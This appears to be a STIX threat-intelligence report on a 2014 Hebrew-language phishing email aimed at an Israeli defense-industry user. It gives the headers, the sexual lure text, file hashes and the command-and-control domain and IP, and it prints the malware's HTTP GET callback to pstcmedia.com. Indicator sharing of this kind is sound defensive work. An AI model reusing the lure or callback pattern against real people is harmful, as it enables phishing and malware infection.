stix:STIX_Header.stix:Title: Hebrew Language Phishing Email with Free Love Theme Includes a Malicious Attachment
stix:STIX_Header.stix:Description: On 11 May 2014, a Hebrew language phishing email was sent from redetube03@gmail.com to a defense industrial base (DIB) user in Israel. The email included the subject "זה היה באמצע הרחוב" and the malicious attachment freelove.rar (MD5: F5007ED283ED0C26CA9CF3B30DF1B78F). If installed successfully, the malware calls back to pstcmedia.com (188.40.81.136).

stix:Indicator.indicator:Description:
--- BEGIN EMAIL HEADER ---- Return-Path: <redetube03@gmail.com> Subject: =?utf-8?b?15bXlCDXlNeZ15Qg15HXkNee16bXoiDXlNeo15fXldeR?= X-SENDER-IP: 74.125.82.193 X-SENDER-REPUTATION: 4.8 Received: from mail-we0-f193.google.com ([74.125.82.193]) ; 11 May 2014 09:52:49 +0000 Received: by mail-we0-f193.google.com with SMTP id u57so1455449wes.8 ; Sun, 11 May 2014 02:52:48 -0700 (PDT) DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20120113; h=mime-version:date:message-id:subject:from:to:content-type; bh=hWif6FhsfFZxskSUS6p+7MXGKTr19I4G1pgse0+k/ko=; b=Ok2RdOzvTyPXSBBgEI68IvwKkziApcPAx1JUSyy7i9QEtP5ZgoIBORFV46C/nK9LAF 3m/JPl88AAcRW0RbrpgBi9Run3aKnbLQEIKHeCYVSzza3gWbpWtDTt8G8jmglJZHYYlB 3QbSJUGNWtWxt7WCm578/2QjQr/V85J7wTa5k0he3o8JGmnyeperSA0L3iYosidYaiXZ 290im5ZO80WJR1XudnTjbNTUmaHkQ9x15r4+YaoAeYb0dEvEepZfcprY2wp+Xzy8jACE nCkxFfug797kmSHpZtCEq393wexlZNljSkzW7sTjR2hAdTqTiV/LHLNHnf1sO5mBHAAO v/Gg== MIME-Version: 1.0 X-Received: by 10.180.219.75 with SMTP id pm11mr10937909wic.8.1399801968422; Sun, 11 May 2014 02:52:48 -0700 (PDT) Received: by 10.194.36.136 with HTTP; Sun, 11 May 2014 02:52:48 -0700 (PDT) Date: Sun, 11 May 2014 12:52:48 +0300 Message-ID: <CAGhX5GKu5Lb25NLvShBLWN_E0gtP3ujwVzCFh4Wau9oPWYpxew@mail.gmail.com> From: rede tube <redetube03@gmail.com> To: undisclosed-recipients:; Content-Type: multipart/mixed; boundary=001a11347bc2164e7704f91ccb33 ---- END EMAIL HEADER ----
---- BEGIN EMAIl BODY ---- בוידיו יש אישה וגבר בסקס פתוח ברחוב מול הכל ---- END EMAIL BODY ----
Translation: Huweidi woman and man have sex open street in front of all
Time Received: 11 May 2014 5:52 EST/09:52:49 (GMT) Sender: redetube03@gmail.com Return-Path: redetube03@gmail.com Subject: זה היה באמצע הרחוב Translation: It was the middle of the street Exploit Description: Attached RAR File with SCR File Targeted Home Markets: Israel Number of Recipients: 1
This malicious attachment contains the file freelove.scr (MD5: 7e0c7cd22cb9886e3d4a14c7b9f319b7).
This is the installer contained in the attachment freelove.rar (MD5: F5007ED283ED0C26CA9CF3B30DF1B78F).
This malicious file was installed by freelove.scr (MD5: 7e0c7cd22cb9886e3d4a14c7b9f319b7).

The malicious file vip.exe (MD5: f7ba0e5a7eeaeb359234b204fb1954ae) sent the following GET request:
GET /do/add_temp.php?name=str14--102762017 HTTP/1.1 Accept: text/* User-Agent: SK Accept-Language: en-us Content-Type: application/x-www-form-urlencoded REMOTE_USER: user Host: pstcmedia.com Cache-Control: no-cache
The domain pstcmedia.com resolved to IP 188.40.81.136 at the time of this report. This domain was identified in previous phishing campaigns IB-14-10236, IB-14-10135A, and IB-14-10156.
